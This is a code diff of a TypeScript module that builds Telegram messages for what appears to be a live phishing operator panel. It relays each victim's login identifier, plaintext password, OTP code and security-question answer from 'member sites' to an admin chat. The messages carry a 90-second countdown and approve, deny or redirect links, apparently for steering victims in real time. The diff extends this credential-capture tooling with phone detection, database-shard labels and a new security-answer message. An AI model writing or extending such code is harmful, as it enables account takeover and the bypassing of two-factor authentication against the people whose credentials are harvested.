@@ -1,24 +1,68 @@
-import { APPROVAL_TIMEOUT_MS } from '@/lib/approval-messages'
+import { APPROVAL_TIMEOUT_MS } from "@/lib/approval-messages"
 
 /** Matches member-site approval poll timeout (90s). */
 export const ADMIN_PENDING_COUNTDOWN_SEC = APPROVAL_TIMEOUT_MS / 1000
 
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
 
-/** Pick User ID / Username / Email label from the value the member entered. */
+/** Detect identifier kind for Telegram labels (email vs username vs phone). */
+export function identifierFieldLabel(
+  value: unknown,
+  methodHint?: string,
+): { emoji: string; label: string } {
+  const raw = typeof value === "string" ? value.trim() : ""
+  const hint = String(methodHint ?? "").toLowerCase()
+
+  if (hint === "phone" || /^\+?[\d\s().-]{7,}$/.test(raw)) {
+    const digits = raw.replace(/\D/g, "")
+    if (
+      hint === "phone" ||
+      (digits.length >= 10 && digits.length <= 15 && !raw.includes("@"))
+    ) {
+      return { emoji: "📱", label: "Phone" }
+    }
+  }
+
+  if (raw.includes("@") && EMAIL_RE.test(raw)) {
+    return { emoji: "📧", label: "Email" }
+  }
+
+  return { emoji: "👤", label: "Username" }
+}
+
+/** Legacy alias used by some member sites (email/username/phone label with emoji). */
 export function loginIdentifierLabel(value: string): string {
   const trimmed = value.trim()
-  if (!trimmed) return '👤 User ID:'
-  if (EMAIL_RE.test(trimmed)) return '👤 Email:'
-  if (/^\d+$/.test(trimmed)) return '👤 User ID:'
+  if (!trimmed) return "👤 User ID:"
+  if (EMAIL_RE.test(trimmed)) return "👤 Email:"
+  if (/^\d+$/.test(trimmed)) return "👤 User ID:"
   if (
     /^[a-zA-Z0-9._-]+$/.test(trimmed) &&
     /[a-zA-Z]/.test(trimmed) &&
-    (trimmed.includes('.') || trimmed.includes('_'))
+    (trimmed.includes(".") || trimmed.includes("_"))
   ) {
-    return '👤 Username:'
+    return "👤 Username:"
   }
-  return '👤 User ID:'
+  return "👤 User ID:"
+}
+
+/** Legacy alias for method-selected form notifications. */
+export function methodEmoji(method?: string): string {
+  const m = String(method ?? "").toLowerCase()
+  if (m === "email") return "📧"
+  if (m === "text" || m === "sms") return "📱"
+  if (m === "call") return "📞"
+  return "📧"
+}
+
+/** Plain identifier line for approval templates (no HTML bold). */
+export function formatIdentifierLine(
+  value: unknown,
+  asCode: (value: unknown) => string,
+  methodHint?: string,
+): string {
+  const { emoji, label } = identifierFieldLabel(value, methodHint)
+  return `${emoji} ${label}: ${asCode(value)}`
 }
 
 export function formatCountdownLabel(secondsLeft: number): string {
@@ -62,12 +106,19 @@ function optionalCountdownLine(
   return `⏱ Time left: ${asCode(formatCountdownLabel(secondsLeft))}\n`
 }
 
+function optionalDatabaseLine(databaseShard: string | undefined, asCode: CodeFn): string {
+  const label = String(databaseShard ?? "").trim()
+  if (!label) return ""
+  return `🗄 Database: ${asCode(label)}\n`
+}
+
 export function buildLoginApprovalRequestBody(data: {
   userId: string
   password?: string
   method?: string
   adminLink: string
   secondsLeft?: number
+  databaseShard?: string
   asCode: CodeFn
   asLink: LinkFn
 }): string {
@@ -75,9 +126,10 @@ export function buildLoginApprovalRequestBody(data: {
   return [
     "🔔 Login request – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
-    `🔑 Password: ${data.asCode(password)}`,
-    `📤 Send Code`,
+    formatIdentifierLine(data.userId, data.asCode),
+    `Password: ${data.asCode(password)}`,
+    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
+    optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
@@ -93,14 +145,16 @@ export function buildOtpApprovalRequestBody(data: {
   method?: string
   adminLink: string
   secondsLeft?: number
+  databaseShard?: string
   asCode: CodeFn
   asLink: LinkFn
 }): string {
   return [
-    "🔔 OTP submitted – approve or deny",
+    "🔢 OTP submitted – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
-    `🔐 Code: ${data.asCode(data.code)}`,
+    formatIdentifierLine(data.userId, data.asCode),
+    `🔢 Code: ${data.asCode(data.code)}`,
+    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
@@ -121,8 +175,32 @@ export function buildMethodApprovalRequestBody(data: {
   return [
     "🔔 Verification method selected – approve or deny",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId)} ${data.asCode(data.userId)}`,
+    formatIdentifierLine(data.userId, data.asCode),
     optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
+    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
+    "",
+    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
+  ]
+    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
+    .join("\n")
+    .replace(/\n{3,}/g, "\n\n")
+}
+
+export function buildSecurityApprovalRequestBody(data: {
+  userId: string
+  question: string
+  answer: string
+  adminLink: string
+  secondsLeft?: number
+  asCode: CodeFn
+  asLink: LinkFn
+}): string {
+  return [
+    "🔐 Security question – approve or deny",
+    "━━━━━━━━━━━━━━━━━━",
+    formatIdentifierLine(data.userId, data.asCode),
+    `❓ Question: ${data.asCode(data.question)}`,
+    `💬 Answer: ${data.asCode(data.answer)}`,
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
@@ -143,7 +221,7 @@ export function buildAdminLoginApprovedBody(data: {
   const lines = [
     data.isOtp ? "✅ CC – OTP Approved" : "✅ CC – Login Approved",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+    formatIdentifierLine(data.userId, data.asCode),
   ]
 
   if (data.isOtp) {
@@ -175,7 +253,7 @@ export function buildAdminLoginDeniedBody(data: {
   const lines = [
     data.isOtp ? "❌ CC – OTP Denied" : "❌ CC – Login Denied",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+    formatIdentifierLine(data.userId, data.asCode),
   ]
 
   if (data.isOtp) {
@@ -202,7 +280,7 @@ export function buildAdminLoginRedirectedBody(data: {
   const lines = [
     data.isOtp ? "↪️ CC – OTP Redirected" : "↪️ CC – Login Redirected",
     "━━━━━━━━━━━━━━━━━━",
-    `${loginIdentifierLabel(data.userId ?? "")} ${data.asCode(data.userId)}`,
+    formatIdentifierLine(data.userId, data.asCode),
   ]
 
   if (data.isOtp) {
